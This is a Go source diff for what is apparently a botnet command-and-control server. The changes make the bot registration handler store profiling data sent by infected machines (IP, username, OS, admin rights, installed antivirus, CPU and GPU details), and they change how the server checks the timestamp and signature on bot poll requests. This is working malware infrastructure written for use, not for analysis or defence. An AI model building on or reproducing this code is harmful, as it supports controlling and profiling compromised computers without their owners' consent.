@@ -7,6 +7,7 @@ import (
 	"crypto/hmac"
 	"database/sql"
 	"encoding/json"
+	"io"
 	"log"
 	"net/http"
 	"strconv"
@@ -49,6 +50,10 @@ func recovery_handler(w http.ResponseWriter, r *http.Request) {
 
 	guid := r.Header.Get("X-Guid")
 	time1 := r.Header.Get("X-Time")
+	// Read bot info
+	botinfo, _ := io.ReadAll(r.Body)
+	var bot common.Client
+	json.Unmarshal(botinfo, &bot)
 
 	reply := common.ServerReply{
 		Args: make(map[string]any),
@@ -65,10 +70,10 @@ func recovery_handler(w http.ResponseWriter, r *http.Request) {
 	err := db1.QueryRow(common.Db, strSql, guid).Scan(&out_guid, &out_token)
 	if err == sql.ErrNoRows {
 		// No such bot, create bot
-		strSql = "insert into clients (guid, token, lastseen) values(?,?,?)"
+		strSql = "insert into clients (guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen) values(?,?,?,?,?,?,?,?,?,?,?,?)"
 		// Generate new token
 		out_token = common.Base64Enc(utils.GenerateRandomBytes(32))
-		_, err = db1.Insert(common.Db, strSql, guid, out_token, time1)
+		_, err = db1.Insert(common.Db, strSql, guid, out_token, bot.Ip, bot.Whoami, bot.Os, bot.Installdate, bot.Isadmin, bot.Antivirus, bot.Cpuinfo, bot.Gpuinfo, bot.Version, time1)
 		if err != nil {
 			// Failed to create a bot
 			reply.Status = 0
@@ -100,12 +105,12 @@ func recovery_handler(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-func check_package_legality(guid string, token string, lastseen string,
-	x_time string, x_sign string) bool {
-	// Overtime
-	time1_bot, _ := strconv.ParseInt(x_time, 10, 64)
-	saved_lastseen_server, _ := strconv.ParseInt(lastseen, 10, 64)
-	if time1_bot-saved_lastseen_server >= 60*1000 {
+func check_package_legality(guid string, token string, x_sign string, x_time string) bool {
+	// Check overtime
+	current_time := utils.GenerateUtcTimestamp()
+	sent_time, _ := strconv.ParseInt(x_time, 10, 64)
+	if current_time-sent_time >= 60*1000 {
+		log.Printf("package overtime")
 		return false
 	}
 	// Check sign
@@ -150,7 +155,7 @@ func poll_handler(w http.ResponseWriter, r *http.Request) {
 		reply.Cmd = "register"
 	} else {
 		// Find it!
-		if !check_package_legality(guid, saved_token, saved_lastseen, time1, sign) {
+		if !check_package_legality(guid, saved_token, sign, time1) {
 			reply.Status = 0
 			reply.Error = "Illegal package"
 			reply.Cmd = "poll"
